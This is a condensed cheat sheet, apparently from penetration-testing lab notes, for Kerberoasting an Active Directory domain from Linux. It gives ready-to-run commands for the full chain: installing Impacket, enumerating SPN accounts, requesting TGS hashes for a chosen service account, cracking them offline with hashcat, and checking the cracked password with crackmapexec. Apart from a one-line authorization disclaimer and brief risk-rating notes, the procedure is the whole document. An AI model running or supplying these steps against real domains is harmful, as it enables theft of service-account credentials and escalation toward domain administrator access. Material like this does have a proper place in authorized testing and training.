### Kerberoasting from Linux – Super Short Version

> For **authorized** AD testing / defense only.

---

## 1️⃣ What Kerberoasting Is

* Target: **service accounts with SPNs** (e.g. MSSQL, backup, ADFS).
* Any **domain user** can request a **TGS** for those SPNs.
* TGS is **encrypted with the service account’s NTLM hash** → you crack it offline.
* Goal: recover **service account passwords**, often:

  * Local admin on many servers
  * Sometimes **Domain Admin**

---

## 2️⃣ Requirements

* Valid **domain user** creds (password or NT hash).
* **DC IP / hostname**.
* Network path to the DC (TCP 88 / 389 / 445 etc.).
* On Linux: **Impacket** + **Hashcat** (or John).

---

## 3️⃣ Install Impacket (once)

```bash
cd /opt
git clone https://github.com/fortra/impacket.git
cd impacket
sudo python3 -m pip install .
```

---

## 4️⃣ Enumerate SPNs (Linux, GetUserSPNs.py)

**List all SPN accounts:**

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

Look for:

* Service accounts
* Members of **Domain Admins** / other privileged groups.

---

## 5️⃣ Pull TGS Hashes

**All SPNs → hashcat-ready output:**

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```

**Single high-value account:**

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend \
  -request-user sqldev \
  -outputfile sqldev_tgs
```

* `-request` / `-request-user` → request TGS + print `$krb5tgs$23$...` hashes.
* `-outputfile` → saves them to a file for cracking.

---

## 6️⃣ Crack Offline with Hashcat

```bash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

* Mode **13100** = **Kerberos 5 TGS-REP etype 23**.
* If cracked, you’ll see: `...:password_here`.

---

## 7️⃣ Verify Access (Example)

```bash
crackmapexec smb 172.16.5.5 -u sqldev -p 'database!'
```

* If `Pwn3d!` or similar → creds valid, often high-priv.

---

## 8️⃣ Reporting / Risk Notes (1-liner style)

* **High risk**: SPNs on privileged accounts with weak/reused passwords.
* **Medium risk**: SPNs present but only strong passwords cracked (or none cracked) → still dangerous if passwords later weakened.
